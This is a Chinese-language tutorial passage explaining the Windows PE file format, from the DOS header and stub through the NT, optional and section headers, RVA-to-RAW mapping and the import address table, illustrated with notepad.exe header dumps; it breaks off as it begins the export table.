_IMAGE_DOS_HEADER &#123; WORD e_magic; // DOS signature : 4D5A (\"MZ\") WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; // offset to NT header&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; IMAGE_DOS_HEADER 结构体的大小为 40 个字节。在该结构中必须知道 2 个重要成员：e_magic 与 e_lfanew。 e_magic：DOS 签名（signature，4D5A=&gt;ASCII 值“MZ”） e_lfanew：指示 NT 头的偏移（根据不同文件拥有可变值） 所有 PE 文件在你开始部分（e_magic）都有 DOS 签名（“MZ”）。e_lfanew 值指向 NT 头所在位置（NT 头的名称为 IMAGE_NT_HEADERS，后面将会介绍）。 一个名叫 Mark Zbikowski 的开发人员在微软设计了 DOS 可执行文件，MZ 即取自其名字的首字母。 根据 PE 规范，文件开始的 2 个字节为 4D5A，e_lfanew 的值为 000000E0（不是 E0000000） Intel 系列的 CPU 以逆序存储数据，称为小端序标识法。 如果尝试修改这些值，会发现程序无法正常运行（因为根据 PE 规范，它已不再是 PE 文件了）。 DOS 存根DOS 存根（stub）在 DOS 头下方，是个可选项，且大小不固定（即使没有 DOS 存根，文件也能正常运行）。DOS 存根由代码与数据混合而成。 图中，文件偏移 40~4D 区域为 16 位的汇编指令。32 位的 Windos OS 中不会运行该命令（由于被识别为 PE 文件，所以完全忽视该代码）。在 DOS 环境中运行 Notepad.exe 文件，或者使用 DOS 调试器（debug.exe）运行它，可使其执行该代码（不认识 PE 文件格式，所以被识别为 DOS EXE 文件）。 在 Windows XP 下打开命令行窗口（cmd.exe），输入debug C:\\Windows\\notepad.exe。输入 “u” 指令（Unassemble），将会出现 16 位的汇编指令。 123456789101112131415161718192021-u0B39:0000 0E PUSH CS0B39:0001 1F POP DS0B39:0002 BA0E00 MOV DX,000E ; DX = 0E : &quot;This program cannot be run in DOS mode&quot;0B39:0005 B409 MOV AH,090B39:0007 CD21 INT 21 ; AH = 09 : WriteString()0B39:0009 B8014C MOV AX,4C010B39:000C CD21 INT 21 ; AX = 4C01 : Exit()0B39:000E 54 PUSH SP0B39:000F 68 DB 680B39:0010 69 DB 690B39:0011 7320 JNB 00330B39:0013 7072 JO 00870B39:0015 6F DB 6F0B39:0016 67 DB 670B39:0017 7261 JB 007A0B39:0019 6D DB 6D0B39:001A 206361 AND [BP+DI+61],AH0B39:001D 6E DB 6E0B39:001E 6E DB 6E0B39:001F 6F DB 6F 代码非常简单，在画面中输出字符串 &quot;This program cannot be run in DOS mode&quot; 后就退出。换言之，notepad.exe文件虽然是 32 位的 PE 文件，但是带有 MS-DOS 兼容模式，可以在 DOS 环境中运行，执行 DOS EXE 代码，输出 &quot;This program cannot be run in DOS mode&quot; 后终止。灵活使用该特性可以在一个可执行文件（EXE）中创建出另一个文件，它在 DOS 与 Windows 中都能运行（在 DOS 环境中运行 16 位 DOS 代码，在 Windows 环境中运行 32 位 Windows 代码）。 如前所述，DOS 存根是可选项，开发工具应该支它（VB、VC++、Delphi 等默认支持 DOS 存根）。 NT 头下面介绍 NT 头 IMAGE_NT_HEADERS。 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PE Signature : 50450000 (\"PE\"00) IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; IMAGE_NT_HEADERS 结构体由 3 个成员组成，第一个成员为签名（Signature）结构体，其值为 50450000h（”PE”00）。另外沥青个成员分别为文件头（File Header）与可选头（Optional Header）结构体。 IMAGE_NT_HEADERS 结构体的大小为 F8，相当大。 NT 头：文件头文件头是表现文件大致属性的 IMAGE_FILE_HEADER 结构体。 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machinie; // 运行平台 WORD NumberOfSections; // 区块表的个数 DWORD TimeDateStamp; // 文件创建时间，是从 1970 年至今的秒数 DWORD PointerToSymbolTable; // 指向符号表的指针 DWORD NumberOfSymbols; // 符号表的数目 WORD SizeOfOptionalHeader; // IMAGE_NT_HEADERS 结构中 OptionHeader 成员的大小，对于 Win32 平台这个值通常是 0x00E0 WORD Characteriistics; // 文件的属性值&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; IMAGE_FILE_HEADERS 结构体中有如下 4 中重要成员（若它们设置不正确，将导致文件无法正常运行）。 Machine每个 CPU 都拥有唯一的 Machine 码，兼容 32 位 Intel x86 芯片的 Machine 码为 14C。以下是定义在 winnt.h 文件中的 Machine 码。 12345678910111213141516171819#define IMAGE_FILE_MACHINE_UNKNOWN 0#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-endian#define IMAGE_FILE_MACHINE_THUMB 0x01c2#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64 NumberOfSections前面提到过，PE 文件把代码、数据、资源等依据属性分类到各节区中存储。 NumberOfSections 用来指出文件中存在的节区数量。该值一定要大于 0，且当定义的节区数量与实际节区不同时，将发生运行错误。 SizeOfOptionalHeaderIMAGE_NT_HEADER 结构体的最后一个成员为 IMAGE_OPTIONAL_HEADER32 结构体。SizeOfOptionalHeader 成员用来指出 IMAGE_OPTIONAL_HEADER32 结构体的长度。IMAGE_OPTIONAL_HEADER32 结构体由 C 语言编写而成，故其大小已经确定。但是 Windows 的 PE 装载器需要查看 IMAGE_FILE_HEADER 的 SizeOfOptionalHeader 值，从而识别出 IMAGE_OPTIONAL_HEADER32 结构体的大小。 PE32+ 格式的文件中使用的是 IMAGE_OPTIONAL_HEADER64 结构体，而不是 IMAGE_OPTIONAL_HEADER32 结构体。2 个结构体的尺寸是不同的，所以需要在 SizeOfOptionalHeader 成员中明确指出结构体的大小。 借助 IMAGE_DOS_HEADER 的 e_lfanew 成员与 IMAGE_FILE_HEADER 的 SizeOfOptionalHeader 成员，可以创建出一种脱离常规的 PE 文件（PE Patch）（也有人称之为 “麻花” PE 文件） Characteristics该字段用于标识文件的属性，文件是否可运行的形态、是否为 DLL 文件等信息，以 bit OR 形式组合起来。 以下是定义在 winnt.h 文件中的 Characteristics 值（请记住 0002h 与 2000h 这两个值）。 12345678910111213141516171819#define IMAGE_FILE_RELOCS_STRIPPED 0x0001 // Relocation info stripped from file.#define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 // File is executable // (i.e. no unresolved externel references).#define IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 // Line numbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 // Agressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO 0x0080 // byte of machine word are reversed.#define IMAGE_FILE_32BIT_MACHINE 0x0100 // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED 0x0200 // Debugging info stripped from // file in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 // If Image is on removable media, // copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 // If Image is on Net, // copy and run from the swap file.#define IMAGE_FILE_SYSTEM 0x1000 // System File.#define IMAGE_FILE_DLL 0x2000 // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 // File should only be run on a UP machine#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000 // byte of machine word are reversed. PE 中 Characteristics 的值有可能不是 0002h（不可执行），比如类似 *.obj 的 object 文件以及 resource DLL 文件等。 最后讲一下 IMAGE_FILE_HEADER 的 TimeDateStamp 成员。改成成员的值不影响文件运行，用来记录编译器创建此文件的时间。但是有些开发工具（VB、VC++）提供了设置该值的工具，而有些开发工具（Delphi）则未提供（且随所用选项的不同而不同）。 IMAGE_FILE_HEADERIMAGE_FILE_HEADER 的结构体。 以结构体成员的形式表示如下。 12345678910111213141516[ IMAGE_FILE_HEADER ] - notepad.exe offset value description--------------------------------------------------------------------------000000E4 014C machine000000E6 0003 number of sections000000E8 48025287 time date stamp (Mon Apr 14 03:35:51 2008)000000EC 00000000 offset to symble table000000F0 00000000 number of symbols000000F4 00E0 size of optional header000000F6 010F characteristics IMAGE_FILE_RELOCS_STRIPPED IMAGE_FILE_EXECUTABLE_IMAGE IMAGE_FILE_LINE_NUMS_STRIPPED IMAGE_FILE_LOCAL_SYMS_STRIPPED IMAGE_FILE_32BIT_MACHINE NT 头：可选头IMAGE_OPTIIONAL_HEADER32 是 PE 头结构体中最大的。 12345678910111213141516171819202122232425262728293031323334353637383940414243typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16typedef struct _IMAGE_OPTIONAL_HEADER &#123; // Standard fields. WORD Magic; // 标志字, ROM 映像（0107h），普通可执行文件（010Bh） BYTE MajorLinkerVersion; // 链接程序的主版本号 BYTE MinorLinkerVersion; // 链接程序的次版本号 DWORD SizeOfCode; // 所有含代码的节的总大小 DWORD SizeOfInitializedData; // 所有含已初始化数据的节的总大小 DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小 DWORD AddressOfEntryPoint; // 程序执行入口 RVA DWORD BaseOfCode; // 代码的区块的起始 RVA DWORD BaseOfData; // 数据的区块的起始 RVA // NT additional fields. DWORD ImageBase; // 程序的首选装载地址 DWORD SectionAlignment; // 内存中的区块的对齐大小，一般为 0x1000 DWORD FileAlignment; // 文件中的区块的对齐大小，一般为 0x200 WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号 WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的副版本号 WORD MajorImageVersion; // 可运行于操作系统的主版本号 WORD MinorImageVersion; // 可运行于操作系统的次版本号 WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号 WORD MinorSubsystemVersion; // 要求最低子系统版本的次版本号 DWORD Win32VersionValue; // 莫须有字段，不被病毒利用的话一般为 0 DWORD SizeOfImage; // 映像装入内存后的总尺寸 DWORD SizeOfHeaders; // 所有头 + 区块表的尺寸大小 DWORD CheckSum; // 映像的校检和 WORD Subsystem; // 可执行文件期望的子系统 WORD DllCharacteristics; // DllMain() 函数何时被调用，默认为 0 DWORD SizeOfStackReserve; // 初始化时的栈大小 DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 DWORD LoaderFlags; // 与调试有关，默认为 \b0 DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16 // 数据目录表，保存了各种表的RVA及大小 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 在 IMAGE_OPTIONAL_HEADER32 结构体中需要关注下列成员。这些值谁文件运行必需的，设置错误将导致文件无法正常运行。 Magic为 IMAGE_OPTIONAL_HEADER32 结构体时，Magic 码为 10B；为 IMAGE_OPTIONAL_HEADER64 结构体时，Magic 码为 20B。 AddressOfEntryPointAddressOfEntryPoint 持有 EP 的 RVA 值。该值指出程序最先执行的代码起始地址，相当重要。 ImageBase进程虚拟内存的范围时 0~FFFFFFFF（32 位系统）。PE 文件被加载到如此大的内存中时，ImageBase 指出文件的优先装入地址。 EXE、DLL 文件被装载到用户内存的 0~7FFFFFFF 中，SYS 文件被载入内核内存的 80000000~FFFFFFFF 中。一般而言，使用开发工具（VB/VC++/Delphi）创建好 EXE 文件后，其 ImgaeBase 的值为 00400000，DLL 文件的 ImgaeBase 值为 10000000（当然也可以指定为其他值）。执行 PE 文件时，PE 装载器先创建进程，再将文件载入内存，然后把 EIP 寄存器的值设置为 ImageBase+AddressOfEntryPoint。 SectiionAlignment，FileAlignmentPE 文件的 Body 部分划分为若干节区，这些节存储着不同类别的数据。FileAlignment 指定了节区在磁盘文件中的最小单位，而 SectionAlignment 则指定了节区在内存中的最小单位（一个文件中，FileAlignment 与 SectionAlignment 的值可能相同，也可能不同）。磁盘文件或内存的节区大小必定为 FileAlignment 或 SectionAlignment 值的整数倍。 SizeOfImage加载 PE 文件到内存时，SizeOfImage 指定了 PE Image 在虚拟内存中所占的空间的大小。一般而言，文件的大小与加载到内存中的大小是不同的（节区头中定义了各节装载的位置与占有内存的大小）。 SizeOfHeaderSizeOfHeader 用来指出整个 PE 头的大小。该值也必须是 FileAlignment 的整数倍。第一节区所在位置与 SizeOfHeader 距文件开始偏移的量相同。 Subsystem该 Subsystem 值用来区分系统驱动文件（*.sys）与普通的可执行文件（*.exe，*.dll）。Subsystem 成员可拥有的值如下。 值 含义 备注 1 Driver 文件 系统驱动（如：ntfs.sys） 2 GUI 文件 窗口应用程序（如：notepad.exe） 3 CUI 文件 控制台应用程序（如：cmd.exe） NumberOfRvaAndSizesNumberOfRvaAndSizes 用来指定 DataDirectory（IMAGE_OPTIONAL_HEADER32 结构体的最后一个成员）数组的个数。虽然结构体定义中明确指出了数组个数为 IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16)，但是 PE 装载器通过查看 NumberOfRvaAndSizes 值来识别数组大小，换言之，数组大小也可能不是 16。 DataDirectoryDataDirectory 是由 IMAGE_DATA_DIRECTORY 结构体组成的数组，数组的每项都有被定义的值。 12345678910111213141516DataDirectory[0] = EXPORT DirectoryDataDirectory[1] = IMPORT DirectoryDataDirectory[2] = RESOURCE DirectoryDataDirectory[3] = EXCEPTION DirectoryDataDirectory[4] = SECURITY DirectoryDataDirectory[5] = BASERELOC DirectoryDataDirectory[6] = DEBUG DirectoryDataDirectory[7] = COPYRIGHT DirectoryDataDirectory[8] = GLOBALPTR DirectoryDataDirectory[9] = TLS DirectoryDataDirectory[A] = LOAD_CONFIG DirectoryDataDirectory[B] = BOUND_IMPORT DirectoryDataDirectory[C] = IAT DirectoryDataDirectory[D] = DELAY_IMPORT DirectoryDataDirectory[E] = COM_DESCRIPTOR DirectoryDataDirectory[F] = Reserved Directory 将此处所说的 Directory 想成某个结构体数组即可。比较重要的是EXPORT/IMPORT/RESOURCE、TLS Direction。 IMAGE_OPTIONAL_HEADERIMAGE_OPTIONAL_HEADER 整个结构体。 结构体各成员的值及其说明如下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[ IMAGE_OPTIONAL_HEADER ] - notepad.exe offset value description--------------------------------------------------------------------------000000F8 010B magic000000FA 07 major liinker version000000FB 0A minor liinker version000000FC 00007800 size of code00000100 00008C00 size of initialized data00000104 00000000 size of uninitialized data00000108 0000739D address of entry point0000010C 00001000 base of code00000110 00009000 base of data00000114 01000000 image base00000118 00001000 section alignment0000011C 00000200 file alignment00000120 0005 major OS version00000122 0001 minor OS version00000124 0005 major image version00000126 0001 minor image version00000128 0004 major subsystem version0000012A 0000 minor subsystem version0000012C 00000000 win32 version value00000130 00014000 size of image00000134 00000400 size of headers00000138 000126CE Checksum0000013C 0002 subsystem0000013E 8000 DLL characteristics00000140 00040000 size of stack reserve00000144 00011000 size of stack commit00000148 00100000 size of heap reserve0000014C 00001000 size of heap commit00000150 00000000 loader flags00000154 00000010 number of directories00000158 00000000 RVA of EXPORT Directory0000015C 00000000 size of EXPORT Directory00000160 00007604 RVA of IMPORT Directory00000164 000000C8 size of IMPORT Directory00000168 00000000 RVA of RESOURCE Directory0000016C 00008304 size of RESOURCE Directory00000170 00000000 RVA of EXCEPTION Directory00000174 00000000 size of EXCEPTION Directory00000178 00000000 RVA of SECURITY Directory0000017C 00000000 size of SECURITY Directory00000180 00000000 RVA of BASERELOC Directory00000184 00000000 size of BASERELOC Directory00000188 00001350 RVA of DEBUG Directory0000018C 0000001C size of DEBUG Directory00000190 00000000 RVA of COPYRIGHT Directory00000194 00000000 size of COPYRIGHT Directory00000198 00000000 RVA of GLOBALPTR Directory0000019C 00000000 size of GLOBALPTR Directory000001A0 00000000 RVA of TLS Directory000001A4 00000000 size of TLS Directory000001A8 000018A8 RVA of LOAD_CONFIG Directory000001AC 00000040 size of LOAD_CONFIG Directory000001B0 00000250 RVA of BOUND_IMPORT Directory000001B4 000000D0 size of BOUND_IMPORT Directory000001B8 00001000 RVA of IAT Directory000001BC 00000348 size of IAT Directory000001C0 00000000 RVA of DELAY_IMPORT Directory000001C4 00000000 size of DELAY_IMPORT Directory000001C8 00000000 RVA of COM_DESCRIPTOR Directory000001CC 00000000 size of COM_DESCRIPTOR Directory000001D0 00000000 RVA of Reserved Directory000001D4 00000000 size of Reserved Directory 节区头节区头中定义了各节区属性。前面提到过，PE 文件中的 code（代码）、data（数据）、resource（资源）等按照属性分类存储在不同节区。 把 PE 文件创建成多个节区结构的好处是可以保证程序的安全性。若把 code 与 data 放在一个节区中相互纠缠很容易引发安全问题，即使忽略过程的烦琐。 假如向字符串 data 写数据时，由于某个原因导致溢出（输入超过缓冲区大小时），那么其下的 code（指令）就会被覆盖，应用程序就会崩溃。因此，PE 文件格式的设计者们决定把具有相似属性的数据统一保存在一个被称为 “节区” 的地方，然后需要把各节区属性记录在节区头中（节区属性中有文件/内存的起始位置、大小、访问权限等）。 换言之，需要为每个 code/data/resource 分别设置不同的特性、访问权限等，如下表。 类别 访问权限 code 执行，读取权限 data 非执行，读写权限 resource 非执行，读取权限 IMAGE_SECTION_HEADER节区头是由 IMAGE_SECTION_HEADER 结构体组成的数组，每个结构体对应一个节区。 1234567891011121314151617# define IMAGE_SIZEOF_SHORT_NAME 8typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 区块的名称，如 “.text” union &#123; DWORD PhysicalAddress; // 物理地址 DWORD VirtualSize; // 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个 &#125; Misc; DWORD VirtualAddress; // 节区的 RVA 地址 DWORD SizeOfRawData; // 在文件中对齐后的尺寸 DWORD PointerToRawData; // 在文件中的偏移量 DWORD PointerToRelocations; // 在 OBJ 文件中使用，重定位的偏移 DWORD PointerToLinenumbers; // 行号表的偏移（供调试使用地) WORD NumberOfRelocations; // 在 OBJ 文件中使用，重定位项数目 WORD NumberOfLinenumbers; // 行号表中行号的数目 DWORD Characteristics; // 节属性如可读，可写，可执行等&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 下表中列出了 IMAGE_SECTION_HEADER 结构体中要了解的重要成员（不使用其他成员）。 项目 含义 VirtualSize 内存中节区所占大小 VirtualAddress 内存中节区起始地址（RVA） SizeOfRawData 磁盘文件中节区所占大小 PointerToRawData 磁盘文件中节区起始位置 Characteristics 节区属性（bit OR） VirtualAddress 与 PointerToRawData 不带有任何值，分别由（定义在 IMAGE_OPTIONAL_HEADER32 中的）SectionAlignment 与 FileAlignment 确定。 VirutalSize 与 SizeOfRawData 一般具有不同的值，即磁盘文件中节区的大小与加载到内存中的节区大小是不同的。 Characteristics 由以下代码中现实的值组合（bit OR）而成。 123456#define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code.#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 // Section contains initialized data.#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 // Section contains uninitialized data.#define IMAGE_SCN_MEM_EXECUTE 0x20000000 // Section is executable.#define IMAGE_SCN_MEM_READ 0x40000000 // Section is readable.#define IMAGE_SCN_MEM_WRITE 0x80000000 // Section is writable. 最后讲一下 Name 字段。Name 成员不像 C 语言中的字符串一样以 NULL 结束，并且没有 “必须使用 ASCII 值” 的限制。PE 规范未明确规定节区的 Name，所以可以向其中仿佛任何值，甚至可以填充 NULL 值。所以节区的 Name 仅供参考，不能保证其百分之百地被用作某种信息（数据节区的名称也可叫做 .code）。 各结构体成员如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[ IMAGE_SECTION_HEADER ] offset value description--------------------------------------------------------------------------000001D8 2E746578 Name (.text)000001DC 74000000000001E0 00007748 virtual size000001E4 00001000 RVA000001E8 00007800 size of raw data000001EC 00000400 offset to raw data000001F0 00000000 offset to relocations000001F4 00000000 offset to line numbers000001F8 0000 number of relocations000001FA 0000 number of line numbers000001FC 60000020 characteristics IMAGE_SCN_CNT_CODE IMAGE_SCN_MEM_EXECUTE IMAGE_SCN_MEM_READ00000200 2E646174 Name (.data)00000204 6100000000000208 00001BA8 virtual size0000020C 00009000 RVA00000210 00000800 size of raw data00000214 00007C00 offset to raw data00000218 00000000 offset to relocations0000021C 00000000 offset to line numbers00000220 0000 number of relocations00000222 0000 number of line numbers00000224 C0000040 characteristics IMAGE_SCN_CNT_INITIALIZED_DATA IMAGE_SCN_MEM_READ IMAGE_SCN_MEM_WRITE00000228 2E727372 Name (.rsrc)0000022C 6300000000000230 00008304 virtual size00000234 0000B000 RVA00000238 00008400 size of raw data0000023C 00008400 offset to raw data00000240 00000000 offset to relocations00000244 00000000 offset to line numbers00000248 0000 number of relocations0000024A 0000 number of line numbers0000024C 40000040 characteristics IMAGE_SCN_CNT_INITIALIZED_DATA IMAGE_SCN_MEM_READ 讲解 PE 文件时经常出现 “映像” （Image）这一术语。PE 文件加载到内存时，文件不会原封不动地加载，而要根据节区头中定义的节区起始地址、节区大小等加载。因此，磁盘文件中的 PE 与内存中的 PE 具有不同形态。将装载到内存中的形态称为 “映像” 以示区别。 RVA to RAWPE 文件加载到内存时，每个节区都要能准确完成内存骶椎与文件偏移间的映射。这种映射一般称为 RVA to RAW，方法如下。 查找 RVA 所在节区。 使用简单的公式计算文件偏移（RAW）。 根据 IMAGE_SECTION_HEADER 结构体，换算公式如下： 12RAW - PointerToRawData = RVA - VirtualAddress RAW = RVA - VirtualAddress + PointerToRawData IATIAT（Import Address Table，导入地址表）保存的内容与 Windows 操作系统的核心进程、内存、DLL 结构等有关。换句话说，只要理解了 IAT，就掌握了 Windows 操作系统的根基。简言之 IAT 是一种表格，用来记录程序正在使用哪些库中的哪些函数。 RVA 与 RAW（文件偏移）间的相互变换是 PE 头的最基本的内容。 DLLDLL（Dynamic Linked Library）撑起了整座 Windows OS 大厦，它被翻译成 “动态链接库”。 16 位的 DOS 时代不存在 DLL 这一概念，只有 “库”（Library）一说。比如在 C 语言中使用 printf() 函数时，编译器会先从 C 库中读取相应函数的二进制代码，然后插入（包含到）应用程序。也就是说，可执行文件中包含着 printf() 函数的二进制代码。Windows OS 支持多任务，若仍采用这种包含库的方式，会非常没有效率。Windows 操作系统使用了数量庞大的库函数（进程、内存、窗口、消息等）来支持 32 位的 Windows 环境。同时运行多个程序时，若仍像以前一样每个程序运行时都包含相同的库，将造成严重的内存浪费（当然磁盘空间的浪费也不容小嘘）。因此，Windows OS 设计者们根据需要引入了 DLL 这一概念，描述如下。 不要把库包含到程序中，单独组成 DLL 文件，需要时调用即可。 内存映射技术使加载后的 DLL 代码、资源在多个进程中实现共享。 更新库时只要替换相关 DLL 文件即可，简便易行。 加载 DLL 的方式实际有两种：一种是 “显式链接”（Explicit Linking），程序使用 DLL 时加载，使用完毕后释放内存；另一种是 “隐式链接”（Implicit Linking），程序开始时即一同加载 DLL，程序终止时再释放占用的内存。IAT 提供的机制即与隐式链接有关。接下来用 OllyDbg 打开 notepad.exe 来查看 IAT，下图是 CreateFileW() 函数的代码，该函数位于 kernel32.dll 中。 调用 CreateFileW() 函数时并非直接调用，而是通过获取 01001104 地址处的值来实现（所有 API 调用均采用这种方式）。 地址 01001104 是 notepad.exe 中 .text 节区的内存区域（更确切地说是 IAT 内存区域）。01001104 地址的值为 7C8107F0，而 7C8107F0 地址即是加载到 notepad.exe 进程内存中的 CreateFileW() 函数（位于 kernel32.dll 库中）的地址。 那么为什么不直接 CALL 7C8107F0 呢？事实上，notepad.exe 程序的制作者编译（生成）程序时，并不知道该 notepad.exe 程序运行在哪种 Windows（9X、2K、XP、Vista、7 等）、哪种语言（ENG、JPN、KOR 等）、哪种服务包（Service Pack）下。上面列举出的所有环境中，kernel32.dll 的版本各不相同，CreateFileW() 函数的位置（地址）也不相同。为了确保在所有环境中都能正常地调用 CreateFileW() 函数，编译器准备了要保存 CreateFileW() 函数实际地址的位置（01001104），并记下 CALL DWORD PTR DS:[01001104] 形式的指令。执行文件时，PE 装载器将 CreateFileW() 函数的地址写到 01001104 位置。 编译器不使用 CALL 7C8107F0 语句的另一个原因在于 DLL 重定位。DLL 文件的 ImageBase 值一般为 10000000。比如某个程序使用 a.dll 与 b.dll 时，PE 装载器先把 a.dll 装载到内存的 10000000（ImageBase）处，然后尝试把 b.dll 也装载到该处。但是由于该地址处已经装载了 a.dll，所以 PE 装载器查找其他空白的内存空间（ex：3E000000），然后将 b.dll 装载进去。 这就是所谓的 DLL 重定位，它使我们无法对实际地址硬编码。另一个原因在于，PE 头中表示地址时不使用 VA，而是 RVA。 实际操作中无法保证 DLL 一定会被加载到 PE 头内指定的 ImageBase 处。但是 EXE 文件（生成进程的主体）却能准确加载到自身的 ImageBase 中，因为它拥有自己的虚拟空间。 PE 头的 IAT 是代码逆向分析的核心内容。 IMAGE_IMPORT_DESCRIPTORIMAGE_IMPORT_DESCRIPTOR 结构体中记录着 PE 文件要导入哪些库文件。 Import：导入，向库提供服务（函数）。Export：导出，从库向其他 PE 文件提供服务（函数）。 IMAGE_IMPORT_DESCRIPTOR 结构体如下所示。 123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristiics; DWORD OriginalFirstThunk; // INT(Import Name Table) address (RVA) &#125; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; // library name string address (RVA) DWORD FirstThunk; // IAT(Import Address Table) address (RVA)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef struct _IMAGE_IMPORTBY_NAME &#123; WORD Hint; // ordinal BYTE Name[1]; // function name string&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 执行一个普通程序时往往需要导入多个库，导入多少库就存在多少个 IMAGE_IMPORT_DESCRIPTOR 结构体，这些结构体形成了数组，且结构体数组最后以 NULL 结构体结束。IMAGE_IMPORT_DESCRIPTOR 中重要的成员如下表所示（拥有全部 RVA 值）。 项目 含义 OriginalFirstThunk INT 的地址（RVA） Name 库名称字符串的地址（RVA） FirstThunk IAT 的地址（RVA） PE 头中提到的 “Table” 即指数组。INT 与 IAT 是长整型（4 个字节数据类型）数组，以 NULL 结束（未另外明确指出大小）。INT 中各元素的值为 IMAGE_IMPORT_BY_NAME 结构体指针（有时 IAT 也拥有相同的值）。INT 与 IAT 的大小应相同。 下图为 notepad.exe 之 kernel32.dll 的 IMAGE_IMPORT_DESCRIPTOR 结构。 INT 与 IAT 的各元素同时指向相同地址，但也有很多情况下它们是不一致的。 下面为 PE 装载器把导入函数输入之 IAT 的顺序。 读取 IID 的 Name 成员，获取库名称字符串（“kernel32.dll”）。 装载相应库。-&gt; LoadLibrary(&quot;kernel32.dll&quot;) 读取 IID 的 OriginialFirstThunk 成员，获取 INT 地址。 逐一读取 INT 中数组的值，获取相应 IMAGE_IMPORT_BY_NAME 地址（RVA）。 使用 IMAGE_IMPORT_BY_NAME 的 Hint（ordinal）或 Name 项，获取相应函数的起始地址。-&gt; GetProcAddress(&quot;GetCurrentThreadld&quot;) 读取 IID 的 FirstThunk（IAT）成员，获得 IAT 地址。 将上面获得的函数地址输入相应 IAT 数组值。 重复以上步骤 4~7，直到 INT 结束（遇到 NULL 时）。 EATWindows 操作系统中，“库” 是为了方便其他程序调用而集中包含相关函数的文件（DLL/SYS）。Win32 API 是最具代表性的库，其中的 kernel32.dll 文件被称为最核心的库文件。 EAT 是一种核心机制，它使不同应用程序可以调用库文件中提供的函数。也就是说，只有通过 EAT 才能准确求得从相应库中导出函数的起始地址。与 IAT 一样，PE 文件内的特定结构体（IMAGE_EXPORT_DIRECTORY）保存着导出信息，且 PE 文件中仅有一个用来说明库 EAT 的 IMAGE_EXPORT_DIRECTORY 结构体。 用来说明 IAT 的 IMAGE_IMPORT_DESCRIPTOR 结构体以数组形式存在，且拥有多个成员。这样是因为 PE 文件可以同时导入多个库。 可以在 PE 文件的 PE 头查找到 IMAGE_EXPORT_DIRECTORY 